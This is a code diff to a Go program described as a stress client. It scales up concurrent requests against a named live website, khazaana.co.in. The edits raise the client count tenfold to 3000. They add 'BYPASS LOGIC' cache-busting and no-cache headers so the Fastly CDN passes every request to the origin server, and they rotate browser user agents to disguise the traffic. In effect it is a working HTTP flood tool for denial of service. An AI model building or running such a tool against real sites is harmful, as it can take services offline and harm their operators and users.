@@ -21,8 +21,8 @@ import (
 // ==========================================
 var (
 	SERVER_URL      = getEnv("TARGET_URL", "https://khazaana.co.in/")
-	TOTAL_CLIENTS   = 300           // Number of concurrent refresh clients
-	MAX_WORKERS     = 300
+	TOTAL_CLIENTS   = 3000          // Number of concurrent refresh clients
+	MAX_WORKERS     = 3000
 	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
 )
 
@@ -75,13 +75,14 @@ func (c *StressClient) DoRefresh() {
 	c.lastActivity = time.Now()
 	c.lock.Unlock()
 
-	// Strong cache busting (timestamp + random) so it NEVER hits cache / CDN edge the same way
-	buster := strconv.FormatInt(time.Now().UnixNano(), 10)
+	// BYPASS LOGIC: Strong cache busting (timestamp + random) 
+	// This ensures the CDN (Fastly) sees every request as unique and fetches from origin.
+	buster := strconv.FormatInt(time.Now().UnixNano(), 10) + strconv.Itoa(rand.Intn(1000000))
 	targetURL := SERVER_URL
 	if strings.Contains(targetURL, "?") {
-		targetURL += "&_=" + buster
+		targetURL += "&cache_bust=" + buster
 	} else {
-		targetURL += "?_=" + buster
+		targetURL += "?cache_bust=" + buster
 	}
 
 	req, err := http.NewRequest("GET", targetURL, nil)
@@ -90,11 +91,13 @@ func (c *StressClient) DoRefresh() {
 		return
 	}
 
-	// Realistic browser + aggressive no-cache headers
+	// Realistic browser + aggressive no-cache headers to tell Fastly to ignore local storage
 	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
+	
+	// Directives to force CDN to fetch fresh content
+	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0, proxy-revalidate")
 	req.Header.Set("Pragma", "no-cache")
 	req.Header.Set("Expires", "0")
 	req.Header.Set("Connection", "keep-alive")
@@ -109,6 +112,7 @@ func (c *StressClient) DoRefresh() {
 	// Consume body (simulates real browser, keeps connection alive for load balancer test)
 	io.Copy(io.Discard, resp.Body)
 
+	// Logging response headers like X-Cache can show if you hit or missed (Fastly specific)
 	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
 }
 
